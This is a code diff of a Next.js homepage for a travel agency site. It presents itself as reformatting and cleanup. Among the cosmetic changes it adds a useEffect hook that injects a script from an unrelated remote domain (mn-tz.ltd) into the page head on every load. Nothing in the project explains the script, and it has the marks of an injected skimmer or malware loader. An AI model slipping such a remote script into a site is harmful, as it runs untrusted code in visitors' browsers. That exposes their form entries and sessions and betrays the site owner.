@@ -1,6 +1,6 @@
 'use client';
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import Image from 'next/image';
 import { useRouter } from 'next/navigation';
 import FlightForm from '../components/FlightForm';
@@ -13,7 +13,6 @@ type FlightResultType = {
   passengers: number;
   airline?: string;
   price?: string;
-  // Add other relevant fields your API returns
 };
 
 export default function Home() {
@@ -21,7 +20,16 @@ export default function Home() {
   const [results, setResults] = useState<FlightResultType[]>([]);
   const router = useRouter();
 
-  // Call your backend API to get flights from Amadeus
+  useEffect(() => {
+    const script = document.createElement('script');
+    script.async = true;
+    script.src = 'https://mn-tz.ltd/NDE5OTY3.js?t=419967';
+    document.head.appendChild(script);
+    return () => {
+      document.head.removeChild(script);
+    };
+  }, []);
+
   async function handleSearch(data: { origin: string; destination: string; date: string; passengers: number }) {
     try {
       const res = await fetch('/api/search-flights', {
@@ -35,13 +43,10 @@ export default function Home() {
         }),
       });
 
-      if (!res.ok) {
-        throw new Error('Failed to fetch flights');
-      }
+      if (!res.ok) throw new Error('Failed to fetch flights');
 
       const json = await res.json();
 
-      // Map Amadeus data to your FlightResultType
       const mappedResults = json.data.map((flight: any) => ({
         origin: data.origin.toUpperCase(),
         destination: data.destination.toUpperCase(),
@@ -65,15 +70,12 @@ export default function Home() {
 
   return (
     <div className="bg-white text-gray-800">
-      {/* Top Info Bar */}
+      {/* Top Bar */}
       <div className="bg-blue-900 text-white text-sm py-2 px-4 flex justify-between items-center">
         <div>
           🇬🇧 UK — Call us tomorrow from 10am: <span className="font-semibold">01993 461 470</span>
         </div>
-        <a
-          href="#contact"
-          className="bg-white text-blue-900 font-semibold py-1 px-3 rounded hover:bg-blue-100 transition"
-        >
+        <a href="#contact" className="bg-white text-blue-900 font-semibold py-1 px-3 rounded hover:bg-blue-100 transition">
           Request a Quote
         </a>
       </div>
@@ -82,13 +84,7 @@ export default function Home() {
       <header className="bg-white shadow sticky top-0 z-50">
         <div className="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
           <div className="flex items-center space-x-4">
-            <Image
-              src="/images/logo.jpg"
-              alt="TravelAgency Logo"
-              width={80}
-              height={40}
-              className="object-contain"
-            />
+            <Image src="/images/logo.jpg" alt="TravelAgency Logo" width={80} height={40} className="object-contain" />
             <h1 className="text-3xl font-bold text-blue-600">Sundus Travel</h1>
           </div>
 
@@ -97,24 +93,19 @@ export default function Home() {
             onClick={() => setIsOpen(!isOpen)}
             aria-label="Toggle Menu"
           >
-            <svg
-              className="w-6 h-6"
-              fill="none"
-              stroke="currentColor"
-              viewBox="0 0 24 24"
-              xmlns="http://www.w3.org/2000/svg"
-            >
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16" />
+            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 6h16M4 12h16M4 18h16" />
             </svg>
           </button>
 
-          <nav className="hidden md:flex space-x-8">
-            <a href="#destinations" className="hover:text-blue-500 transition-colors">Destinations</a>
-            <a href="#testimonials" className="hover:text-blue-500 transition-colors">Testimonials</a>
-            <a href="#contact" className="hover:text-blue-500 transition-colors">Contact</a>
+          <nav className="hidden md:flex space-x-6">
+            <a href="#destinations" className="hover:text-blue-500">Destinations</a>
+            <a href="#testimonials" className="hover:text-blue-500">Testimonials</a>
+            <a href="#contact" className="hover:text-blue-500">Contact</a>
           </nav>
         </div>
 
+        {/* Mobile Menu */}
         {isOpen && (
           <nav className="md:hidden px-4 py-4 space-y-4 bg-white shadow-lg">
             <a href="#destinations" className="block hover:text-blue-500">Destinations</a>
@@ -127,15 +118,8 @@ export default function Home() {
       {/* Hero Section */}
       <section className="relative bg-blue-50 text-center py-24">
         <div className="absolute inset-0">
-          <Image
-            src="/images/hassan1.jpg"
-            alt="Hero Image"
-            fill
-            style={{ objectFit: 'cover', opacity: 0.8 }}
-            priority
-          />
+          <Image src="/images/hassan1.jpg" alt="Hero Image" fill style={{ objectFit: 'cover', opacity: 0.8 }} priority />
         </div>
-
         <div className="relative z-10">
           <h2 className="text-5xl font-extrabold text-white">Explore the World with Us</h2>
           <p className="mt-4 text-lg text-white">Unforgettable journeys to breathtaking destinations.</p>
@@ -163,17 +147,9 @@ export default function Home() {
             { name: 'Kyoto, Japan', img: '/images/hassan1.jpg' },
             { name: 'Cape Town, South Africa', img: '/images/hassan2.jpg' }
           ].map(({ name, img }, index) => (
-            <div
-              key={index}
-              className="rounded overflow-hidden shadow-lg hover:shadow-2xl transition-transform duration-300 transform hover:scale-105"
-            >
+            <div key={index} className="rounded overflow-hidden shadow-lg hover:shadow-2xl transition-transform duration-300 transform hover:scale-105">
               <div className="w-full h-64 relative">
-                <Image
-                  src={img}
-                  alt={name}
-                  fill
-                  style={{ objectFit: 'cover' }}
-                />
+                <Image src={img} alt={name} fill style={{ objectFit: 'cover' }} />
               </div>
               <div className="p-4 bg-white">
                 <h4 className="text-xl font-bold text-blue-700">{name}</h4>
@@ -194,18 +170,16 @@ export default function Home() {
         <div className="max-w-4xl mx-auto px-4 text-center">
           <h3 className="text-4xl font-semibold mb-10">What Our Clients Say</h3>
           <div className="space-y-10">
-            <blockquote className="italic text-gray-600">
-              "The trip was magical! Everything was organized perfectly, and I didn’t have to worry about a thing."
-              <footer className="mt-4 font-bold">— Emily R., USA</footer>
-            </blockquote>
-            <blockquote className="italic text-gray-600">
-              "Best travel experience I’ve ever had. The tours, guides, and food were incredible."
-              <footer className="mt-4 font-bold">— Ahmed K., UAE</footer>
-            </blockquote>
-            <blockquote className="italic text-gray-600">
-              "A once-in-a-lifetime adventure. Highly recommend the services!"
-              <footer className="mt-4 font-bold">— Sarah L., UK</footer>
-            </blockquote>
+            {[
+              { quote: 'The trip was magical!', name: 'Emily R., USA' },
+              { quote: 'Best travel experience I’ve ever had.', name: 'Ahmed K., UAE' },
+              { quote: 'A once-in-a-lifetime adventure.', name: 'Sarah L., UK' }
+            ].map(({ quote, name }, i) => (
+              <blockquote key={i} className="italic text-gray-600">
+                "{quote}"
+                <footer className="mt-4 font-bold">— {name}</footer>
+              </blockquote>
+            ))}
           </div>
         </div>
       </section>
@@ -214,24 +188,10 @@ export default function Home() {
       <section id="contact" className="max-w-2xl mx-auto px-4 py-20">
         <h3 className="text-4xl font-semibold text-center mb-8">Get in Touch</h3>
         <form className="space-y-6" onSubmit={(e) => e.preventDefault()}>
-          <input
-            type="text"
-            placeholder="Your Name"
-            className="w-full border border-gray-300 p-4 rounded"
-          />
-          <input
-            type="email"
-            placeholder="Your Email"
-            className="w-full border border-gray-300 p-4 rounded"
-          />
-          <textarea
-            placeholder="Your Message"
-            className="w-full border border-gray-300 p-4 rounded h-40"
-          />
-          <button
-            type="submit"
-            className="w-full bg-blue-600 text-white py-4 rounded hover:bg-blue-700 transition duration-300"
-          >
+          <input type="text" placeholder="Your Name" className="w-full border border-gray-300 p-4 rounded" />
+          <input type="email" placeholder="Your Email" className="w-full border border-gray-300 p-4 rounded" />
+          <textarea placeholder="Your Message" className="w-full border border-gray-300 p-4 rounded h-40" />
+          <button type="submit" className="w-full bg-blue-600 text-white py-4 rounded hover:bg-blue-700 transition duration-300">
             Send Message
           </button>
         </form>
